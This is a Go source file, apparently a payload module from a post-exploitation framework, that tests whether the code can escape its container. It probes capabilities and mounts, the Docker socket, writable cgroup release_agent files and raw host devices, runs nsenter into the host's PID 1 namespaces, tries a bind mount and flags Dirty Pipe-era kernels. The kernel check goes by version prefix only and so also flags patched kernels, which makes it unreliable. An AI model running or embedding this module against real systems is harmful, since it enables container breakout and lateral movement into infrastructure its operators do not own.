package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

func init() {
	Register(&ContainerEscape{})
}

type ContainerEscape struct{}

func (c *ContainerEscape) Name() string     { return "container_escape" }
func (c *ContainerEscape) Category() string { return "lateral" }
func (c *ContainerEscape) Description() string {
	return "Container escape techniques (privileged check, cgroup mount, nsenter)"
}

func (c *ContainerEscape) Execute(args map[string]string) ([]byte, error) {
	result := c.assess()
	return MarshalJSON(result)
}

type containerEscapeResult struct {
	Timestamp       string                 `json:"timestamp"`
	Privileges      map[string]interface{} `json:"privileges"`
	EscapeMethods   []escapeMethod         `json:"escape_methods"`
	VulnKernels     []string               `json:"vulnerable_kernels"`
	Recommendations []string               `json:"recommendations"`
}

type escapeMethod struct {
	Name    string `json:"name"`
	Success bool   `json:"success"`
	Detail  string `json:"detail"`
}

func (c *ContainerEscape) assess() *containerEscapeResult {
	r := &containerEscapeResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// 1. Check privileges
	r.Privileges = checkContainerPrivs()

	// 2. Try escape techniques
	r.EscapeMethods = append(r.EscapeMethods, tryDockerSocket())
	r.EscapeMethods = append(r.EscapeMethods, tryCgroupRelease())
	r.EscapeMethods = append(r.EscapeMethods, tryDeviceAccess())
	r.EscapeMethods = append(r.EscapeMethods, tryNsenter())
	r.EscapeMethods = append(r.EscapeMethods, tryMountEscape())

	// 3. Kernel vulns
	r.VulnKernels = checkKernelVulns()

	// 4. Recommendations
	for _, m := range r.EscapeMethods {
		if m.Success {
			r.Recommendations = append(r.Recommendations, m.Name)
		}
	}
	if priv, ok := r.Privileges["privileged"].(bool); ok && priv {
		r.Recommendations = append(r.Recommendations, "privileged_container_escape")
	}
	if root, ok := r.Privileges["is_root"].(bool); ok && root {
		r.Recommendations = append(r.Recommendations, "root_escape_techniques")
	}

	return r
}

func checkContainerPrivs() map[string]interface{} {
	p := make(map[string]interface{})
	p["is_root"] = os.Geteuid() == 0

	// Check capabilities
	data, err := os.ReadFile("/proc/self/status")
	if err == nil {
		content := string(data)
		for _, line := range strings.Split(content, "\n") {
			if strings.HasPrefix(line, "CapEff:") {
				cap := strings.TrimSpace(strings.TrimPrefix(line, "CapEff:"))
				p["capabilities"] = cap
				p["privileged"] = strings.Contains(cap, "0000003fffffffff")
			}
		}
	}

	// Check mounts
	out, err := exec.Command("mount").Output()
	if err == nil {
		mountLines := strings.Split(string(out), "\n")
		var sensitive []string
		for _, m := range []string{"/proc", "/sys", "/dev", "/var/run/docker.sock"} {
			for _, line := range mountLines {
				if strings.Contains(line, m) {
					sensitive = append(sensitive, m)
					break
				}
			}
		}
		p["sensitive_mounts"] = sensitive
		p["mounts"] = mountLines[:min(10, len(mountLines))]
	}

	return p
}

func tryDockerSocket() escapeMethod {
	m := escapeMethod{Name: "docker_socket"}

	dockerSocket := "/var/run/docker.sock"
	if _, err := os.Stat(dockerSocket); os.IsNotExist(err) {
		m.Detail = "No docker socket"
		return m
	}

	if fi, _ := os.Stat(dockerSocket); fi != nil && fi.Mode()&os.ModeSocket != 0 {
		m.Success = true
		m.Detail = "Docker socket accessible"
	} else {
		m.Detail = "Docker socket exists but not accessible"
	}

	return m
}

func tryCgroupRelease() escapeMethod {
	m := escapeMethod{Name: "cgroup_release_agent"}

	// Check cgroup release_agent writability
	paths := []string{
		"/sys/fs/cgroup/release_agent",
		"/sys/fs/cgroup/*/release_agent",
	}

	for _, pattern := range paths {
		if strings.Contains(pattern, "*") {
			matches, _ := exec.Command("sh", "-c", "ls "+pattern+" 2>/dev/null").Output()
			for _, p := range strings.Split(string(matches), "\n") {
				p = strings.TrimSpace(p)
				if p == "" {
					continue
				}
				if f, err := os.Stat(p); err == nil {
					if f.Mode().Perm()&0002 != 0 {
						m.Success = true
						m.Detail = fmt.Sprintf("Writable release_agent: %s", p)
						return m
					}
				}
			}
		} else {
			if f, err := os.Stat(pattern); err == nil && f.Mode().Perm()&0002 != 0 {
				m.Success = true
				m.Detail = fmt.Sprintf("Writable release_agent: %s", pattern)
				return m
			}
		}
	}

	m.Detail = "No writable release_agent found"
	return m
}

func tryDeviceAccess() escapeMethod {
	m := escapeMethod{Name: "device_access"}

	dangerousDevices := []string{"sda", "nvme0n1", "dm-0", "loop0"}
	var accessible []string
	for _, dev := range dangerousDevices {
		path := fmt.Sprintf("/dev/%s", dev)
		if fi, err := os.Stat(path); err == nil && fi.Mode().Type()&os.ModeDevice != 0 {
			if f, _ := os.OpenFile(path, os.O_RDONLY, 0); f != nil {
				f.Close()
				accessible = append(accessible, dev)
			}
		}
	}

	if len(accessible) > 0 {
		m.Success = true
		m.Detail = fmt.Sprintf("Accessible devices: %s", strings.Join(accessible, ", "))
	} else {
		m.Detail = "No accessible host devices"
	}

	return m
}

func tryNsenter() escapeMethod {
	m := escapeMethod{Name: "nsenter"}

	if _, err := exec.LookPath("nsenter"); err != nil {
		m.Detail = "nsenter not found"
		return m
	}

	// Try to enter host namespace (requires CAP_SYS_ADMIN)
	cmd := exec.Command("nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--pid", "id")
	out, err := cmd.CombinedOutput()
	if err == nil && strings.TrimSpace(string(out)) != "" {
		m.Success = true
		m.Detail = fmt.Sprintf("nsenter successful: %s", strings.TrimSpace(string(out)))
	} else {
		m.Detail = fmt.Sprintf("nsenter failed: %v", err)
	}

	return m
}

func tryMountEscape() escapeMethod {
	m := escapeMethod{Name: "mount_escape"}

	testDir := "/tmp/.test_mount"
	os.MkdirAll(testDir, 0755)
	defer os.RemoveAll(testDir)

	cmd := exec.Command("mount", "--bind", "/tmp", testDir)
	if err := cmd.Run(); err == nil {
		m.Success = true
		m.Detail = "Can create bind mounts"
		exec.Command("umount", testDir).Run()
	} else {
		m.Detail = fmt.Sprintf("Cannot mount: %v", err)
	}

	return m
}

func checkKernelVulns() []string {
	var vulns []string
	out, _ := exec.Command("uname", "-r").Output()
	kernel := strings.TrimSpace(string(out))

	// Dirty Pipe (CVE-2022-0847)
	if strings.HasPrefix(kernel, "5.8") || strings.HasPrefix(kernel, "5.9") ||
		strings.HasPrefix(kernel, "5.10") || strings.HasPrefix(kernel, "5.11") ||
		strings.HasPrefix(kernel, "5.12") || strings.HasPrefix(kernel, "5.13") ||
		strings.HasPrefix(kernel, "5.14") || strings.HasPrefix(kernel, "5.15") ||
		strings.HasPrefix(kernel, "5.16") {
		vulns = append(vulns, "CVE-2022-0847 (Dirty Pipe): "+kernel)
	}

	return vulns
}
